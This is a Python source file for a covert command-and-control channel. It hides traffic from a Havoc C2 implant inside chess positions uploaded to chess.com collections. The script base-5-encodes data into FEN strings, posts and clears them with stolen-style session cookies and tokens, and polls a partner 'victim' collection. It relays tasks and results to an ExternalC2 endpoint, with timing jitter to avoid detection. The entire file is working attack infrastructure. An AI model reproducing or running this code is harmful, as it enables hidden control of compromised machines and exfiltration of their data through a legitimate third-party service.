import requests
import json
import socket
import time
import os
import sys
import base64
import random
import string
import platform
import math
from pathlib import Path

from dotenv import load_dotenv
from havoc.externalc2 import ExternalC2

BASE_DIR = Path(__file__).resolve().parents[1]
load_dotenv(BASE_DIR / ".env")


WAIT_TIME = 5
JITTER = 3

MY_COLLECTION = os.getenv("LISTENER_MY_COLLECTION_ID", "e6af2a10-1801-11f1-911e-05aff8b4a5dd")
PARTNER_COLLECTION = os.getenv("LISTENER_PARTNER_COLLECTION_ID", "3186ea38-1cc5-11f1-a1c5-ad1d0ff2ef4e")

CHESS_COM_COOKIE = os.getenv("LISTENER_CHESS_COM_COOKIE", "")
CHESS_UPLOAD_TOKEN = os.getenv("LISTENER_UPLOAD_TOKEN", "")
CHESS_CLEAR_TOKEN = os.getenv("LISTENER_CLEAR_TOKEN", "")

class Base5Chess:
    ALPHABET = 'PNBRQ'

    def encode(data: bytes) -> str:
        if not data:
            return ''
        # Bytes to big integer
        num = int.from_bytes(data, 'big')
        if num == 0:
            return 'P'  # 0 -> P
        encoded = []
        while num > 0:
            encoded.append(Base5Chess.ALPHABET[num % 5])
            num //= 5
        return ''.join(reversed(encoded))

    def decode(encoded: str) -> bytes:
        if not encoded:
            return b''
        # Base5 string to integer
        num = 0
        for char in encoded:
            num = num * 5 + Base5Chess.ALPHABET.index(char)
        # Back to bytes (trim to exact byte length)
        byte_len = (num.bit_length() + 7) // 8
        return num.to_bytes(byte_len, 'big')

    def stringToFEN(encoded: str) -> str:
        chunks = [encoded[i:i+8] for i in range(0, len(encoded), 8)]
        games = []
        fen_template = ["7k","8","8","8","8","8","8","7K"," w - - 0 1"]
        fen_data = []
        i = 0
        for c in chunks:
            if len(fen_data) < 6:
                if i <= 2:
                    fen_data.append(c.lower())
                else:
                    fen_data.append(c.upper())
            else:
                for f in fen_data:
                    if len(f) < 8:
                        f = f + str(8-len(f))
                games.append([fen_template[0]]+fen_data+[fen_template[7], fen_template[8]])
                fen_data = []
                if c != "":
                    fen_data.append(c.lower())
                    i = 1
                    continue
                else:
                    break
            i += 1
        
        if fen_data != []:
            for i,f in enumerate(fen_data):
                if len(f) < 8:
                    fen_data[i] = f + str(8-len(f))
            games.append([fen_template[0]]+fen_data+(6-len(fen_data))*['8']+[fen_template[7], fen_template[8]])
        res = []
        for g in games:
            res.append(str('/'.join(g[0:8])+str(g[8])))
        return res
    
    def FENToString(fen: str) -> str:
        data = fen.split("/")
        return ''.join(data[1:7])

def uploadGames(games: list[str]):
    headers = {
        "Host": "www.chess.com",
        "Cookie": CHESS_COM_COOKIE,
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.chess.com",
        "Referer": "https://www.chess.com/analysis",
        "User-Agent": "Mozilla/5.0",
    }
    pgn_string = ""
    pgn_template = ("[Event \"?\"]\n[Site \"?\"]\n[Date \"????.??.??\"]\n[Round \"?\"]\n[White \"?\"]\n[Black \"?\"]\n[Result \"*\"]\n[SetUp \"1\"]\n[FEN \"{fen}\"]\n\n*")
    for fen in games:
        pgn_string = pgn_string + "\n\n" + pgn_template.format(fen=fen)
    
    sent = False
    while not sent:
        try:
            data = {
                "_token": CHESS_UPLOAD_TOKEN,
                "pgn": pgn_string,
            }
            response = requests.post("https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/actions/add-from-pgn", headers=headers, json=data)
            response.raise_for_status()
            sent = True
        except Exception as e:
            print(f"Error uploading game {fen}: {e}")
    return

def clearGames():
    print('Clearing games...')
    games = getGames("mine")
    for i in range(0, math.ceil(len(games)/100)):
        try:
            ids, fens = zip(*games)
        except:
            return

        url = "https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/actions/remove-items"

        headers = {
            "Host": "www.chess.com",
            "Cookie": CHESS_COM_COOKIE,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.chess.com",
            "User-Agent": "Mozilla/5.0",
        }

        data = {
            "_token": CHESS_CLEAR_TOKEN,
            "itemIds": list(ids),
        }

        response = requests.post(url, headers=headers, json=data)
        response.raise_for_status()
    return

def getGames(whos):
    import requests
    from typing import List
    if whos == "mine":
        url = "https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/items"
    else:
        # Attacker Collection
        url = "https://www.chess.com/callback/library/collections/"+PARTNER_COLLECTION+"/items"
    params = {
        "page": "1",
        "itemsPerPage": "10000",
        "gameSort": "1",
        "gamePlayer1": "",
    }
    headers = {
        "Host": "www.chess.com",
    }

    response = requests.get(
        url,
        params=params,
        headers=headers,
    )

    response.raise_for_status()
    payload = response.json()

    games: List[List[str]] = []

    for item in payload.get("data", []):
        game_id = item.get("id")
        fen = (
            item.get("typeSpecificData", {})
            .get("shareData", {})
            .get("pgnHeaders", {})
            .get("FEN")
        )
        if game_id and fen:
            if game_id != '1acdf52c-1df4-11f1-87b9-b143e701000d' and game_id != 'e0335fb2-1e19-11f1-88eb-c276b801000d':
                games.append([game_id, fen])
    return games

def uploadData(data):
    time.sleep(WAIT_TIME + random.uniform(0, JITTER))
    clearGames()
    print('Uploading data...')
    encoded = Base5Chess.encode(data)
    games = Base5Chess.stringToFEN(encoded)
    games = ["7k/8/8/8/8/8/8/7K w - - 0 1"]+games
    chunks = [games[i:i + 100] for i in range(0, len(games), 100)]
    for c in chunks[::-1]:
        uploadGames(c)
        time.sleep(WAIT_TIME + random.uniform(0, JITTER))
    return

def downloadData():
    time.sleep(1)
    try:
        print('Downloading data...')
        games = getGames("victim")
        out = ''
        while len(games) < 1:
            time.sleep(3)
            games = getGames("victim")
        while games[0][1] != '7k/8/8/8/8/8/8/7K w - - 0 1':
            time.sleep(3)
            games = getGames("victim")
        for game in games:
            data = Base5Chess.FENToString(game[1])
            out = out+data
        b5 = ''.join(char for char in out.upper() if not char.isdigit())
        b64 = Base5Chess.decode(b5)
        return b64
    except:
        return ""

def getAgentData():
    # Download and decode data from Chess.com
    print("[+] Downloading data")
    res = downloadData()
    print("[+] Got data: "+str(res))
    return res

def sendData(data):
    # Encode and upload data to Chess.com
    print("[+] Sending data: "+str(base64.b64encode(data.encode('utf-8')).decode('utf-8')))
    uploadData(base64.b64encode(data.encode('utf-8')))
    print("[+] Sent data ")
    return

def transmitToC2(data):
    try:
        print("[+] Transmitting data to C2")
        response = externalc2.transmit(base64.b64decode(data))
        print("[+] Received response from C2: " + response + "\n")
        return response
    except:
        return ""

externalc2 = ExternalC2(os.getenv("EXTERNALC2_ENDPOINT", "https://127.0.0.1:40056/ExtEndpoint"))
print("[+] Connected to ExternalC2 endpoint")

prevdata = ""

while True:
    clearGames()
    agentdata = getAgentData()
    if agentdata != "" and (agentdata != prevdata or "gettask\", \"data\": \"\"" in str(base64.b64decode(agentdata))):
        print("[+] Retrieved agent data: "+str(agentdata))
        res = transmitToC2(agentdata)
        print("[+] Received response from C2: "+str(res))
        sendData(res)
    time.sleep(5)
    prevdata = agentdata